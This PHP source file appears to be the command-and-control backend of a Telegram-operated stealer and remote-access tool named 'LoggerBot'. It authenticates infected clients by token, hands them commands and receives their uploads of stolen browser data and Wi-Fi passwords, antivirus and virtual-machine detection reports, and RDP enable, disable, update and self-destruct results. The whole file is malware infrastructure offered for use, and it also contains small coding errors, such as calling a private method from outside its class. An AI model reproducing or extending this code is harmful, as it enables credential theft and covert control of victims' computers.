<?php
require_once __DIR__ . '/config/Config.php';
require_once __DIR__ . '/components/command_list.php';
require_once __DIR__ . '/components/menu.php';
require_once __DIR__ . '/components/telegram_handler.php';
require_once __DIR__ . '/components/commands/av.php';
require_once __DIR__ . '/components/commands/browser_data.php';
require_once __DIR__ . '/components/commands/rdp.php';
require_once __DIR__ . '/components/commands/upload_data.php';
require_once __DIR__ . '/components/commands/vm.php';
require_once __DIR__ . '/components/commands/wifi_passwords.php';
require_once __DIR__ . '/components/encryption/encryption.php';
require_once __DIR__ . '/components/handler/handler.php';

class LoggerBot
{
    private $pdo;

    public function __construct()
    {
        $this->initDatabase();
        $this->initDirectories();
    }

    private function initDatabase()
    {
        try {
            $dsn = "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4";
            $this->pdo = new PDO($dsn, Config::$DB_USER, Config::$DB_PASS);
            $this->pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            $this->pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
        } catch (PDOException $e) {
            $this->logError("Database connection failed: " . $e->getMessage());
            die("Database connection error");
        }
    }

    private function initDirectories()
    {
        $dirs = [Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR, dirname(Config::$ERROR_LOG)];
        foreach ($dirs as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }

    private function handleClientRequest($input)
    {
        header('Content-Type: application/json');

        $data = array_merge($input, $_POST);
        $this->logWebhook("Client request data: " . json_encode($data));

        $action = $data['action'] ?? null;
        $clientId = $data['client_id'] ?? null;

        if (!$action || !$clientId) {
            http_response_code(400);
            $this->logError("Invalid client request: missing action or client_id. Input: " . json_encode($data));
            die(json_encode(['error' => 'Missing action or client_id']));
        }

        $this->updateClientStatus($clientId);

        switch ($action) {
            case 'get_commands':
                $response = $this->getClientCommands($clientId);
                break;
            case 'upload_data':
                $response = $this->handleUploadData($data);
                break;
            case 'command_response':
                $response = $this->handleCommandResponse($data);
                break;
            case 'upload_vm_status':
                $response = $this->handleUploadVMStatus($data);
                break;
            case 'report_self_destruct':
                $response = $this->handleSelfDestructReport($data);
                break;
            case 'report_update':
                $response = $this->handleUpdateReport($data);
                break;
            case 'report_rdp':
                $response = $this->handleRDPReport($data);
                break;
            case 'enable_rdp':
                $response = $this->handleEnableRDP($data);
                break;
            case 'disable_rdp':
                $response = $this->handleDisableRDP($data);
                break;
                // api.php (inside the switch in handleClientRequest)
            case 'upload_wifi_passwords':
                $response = $this->handleUploadWifiPasswords($data);
                break;
            case 'upload_browser_data':
                $response = $this->handleUploadBrowserData($data);
                break;
            case 'upload_antivirus_status':
                $response = $this->handleUploadAntivirusStatus($data);
                break;
            default:
                $response = ['error' => 'Unknown action'];
                break;
        }

        $this->logWebhook("Client response for action: $action, client_id: $clientId, response: " . json_encode($response));
        echo json_encode($response);
    }

    public function handleRequest()
    {
        $rawInput = file_get_contents('php://input');
        $input = json_decode($rawInput, true) ?: [];
        $this->logWebhook("Raw request: $rawInput, POST: " . json_encode($_POST) . ", FILES: " . json_encode($_FILES));

        if (
            isset($_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN']) &&
            $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] === Config::$WEBHOOK_SECRET
        ) {
            $this->handleWebhook($input);
        } elseif (
            (isset($_SERVER['HTTP_X_SECRET_TOKEN']) && $_SERVER['HTTP_X_SECRET_TOKEN'] === Config::$SECRET_TOKEN) ||
            (isset($input['token']) && $input['token'] === Config::$SECRET_TOKEN) ||
            (isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN)
        ) {
            $this->handleClientRequest($input);
        } else {
            http_response_code(401);
            $this->logError("Unauthorized access attempt. Headers: " . json_encode($_SERVER));
            die(json_encode(['error' => 'Unauthorized']));
        }
    }
}
$bot = new LoggerBot();

// Handle client requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['client_id'])) {
    header('Content-Type: application/json');
    echo json_encode($bot->handleClientRequest($_POST));
    exit;
}

// Handle Telegram webhook
$bot->handleRequest();
